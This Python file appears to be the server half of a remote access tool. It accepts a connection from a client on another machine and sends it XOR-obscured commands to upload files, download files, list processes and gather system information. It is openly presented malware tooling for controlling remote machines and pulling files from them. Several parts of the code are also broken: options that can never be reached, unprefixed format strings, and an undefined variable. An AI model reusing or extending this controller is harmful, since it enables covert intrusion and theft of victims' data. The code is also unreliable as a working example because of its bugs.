import socket, select, os

HOST = '127.0.0.1'
PORT = 25565

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((HOST, PORT))
sock.listen(1)

options = """

Commands:

upload
download
processes
systeminfo

"""

OPTIONS = ["upload", "download", "systeminfo", "processes"]

def xor(message):
    newMessage = ""
    for char in message:
        deChar = ord(char) ^ ord('♥')
        newMessage += str(chr(deChar))
    return str.encode(newMessage)

while True:
    conn, addr = sock.accept()
    print ('Connected by ' + str(addr))
  #  rec = conn.recv(15);
  #  print (xorE(rec));

    while True:
        userInput = input(">> ")
        if userInput not in OPTIONS:
            print(f"\n'{userInput}' is not a valid option.\n")
        elif userInput == "end": # sever connection
            conn.sendall(xor("end"))
            conn.shutdown(socket.SHUT_RDWR)
            conn.close()
            break            
        elif userInput.lower() == "upload":
            # syntax: upload /path/to/file/to/upload
            # file will go to client's  current working directory
            print("Uploading...")
            command = userInput.split(' ')

            if len(command) != 2:
                print("Incorrect upload syntax, use two arguments.")
                continue

            userInput = xor(command[0])
            conn.sendall(userInput)

            sourcePath = command.pop(1)
            fileSize = os.stat(sourcePath).st_size
            fileSizeStr = str(fileSize).zfill(10)
            print(fileSizeStr)
            print(f"Filesize of file to upload is: {fileSizeStr}")
            userInput = xor("{fileSizeStr}")
            conn.sendall(userInput)

            with open(sourcePath, 'rb') as file:
                conn.sendall(xor(file.read()))
        
        elif "download" in userInput.lower():
            # syntax: download /remote/path    o/file    o/download /local/path
            # file will go to server's current working directory
            
            command = userInput.split(' ')

            if len(command) != 3:
                print("Incorrect download syntax, use two arguments.")
                continue
                
            destinationPath = command.pop(1)
            f = open(destinationPath, 'w+b')
            print("Writing file to {}\n".format(destinationPath))
            userInput = ' '.join(command)
            userInput = xor(userInput)
            conn.sendall(userInput)
        
            fileuserInput = conn.recv(1024)
            while(fileuserInput):

                fileuserInput = xor(fileuserInput)
                print(fileuserInput)
                ## This will probably break at some point, not ideal solution
                if "99999EOF99999" in fileuserInput:
                    temp = fileuserInput.split("99999EOF99999")
                    if "xxxxx" in temp[0]:
                        temp = temp[0].split("xxxxx")
                        fileSize = temp[1]
                        print("Writing {} bytes.\n".format(fileSize))
                        f.write(temp[2])
                    else:
                        f.write(temp[0])
                    break
                elif "xxxxx" in fileuserInput:
                    temp = fileuserInput.split("xxxxx")
                    fileSize = temp[1]
                    print("Writing {} bytes.\n".format(fileSize))
                    f.write(temp[2])
                    fileuserInput = conn.recv(1024)
                else:
                    f.write(fileuserInput)
                    fileuserInput = conn.recv(1024)    

            print("File download complete!\n")
            f.close()
            break
        else:
            userInput = xor(userInput)
            conn.sendall(userInput)
            recv = conn.recv(1024)
            msg = xor(recv)
            while "gettfouttahereistfg" not in message:
                print(message)
                rec = conn.recv(1024)
                message = xor(rec)
            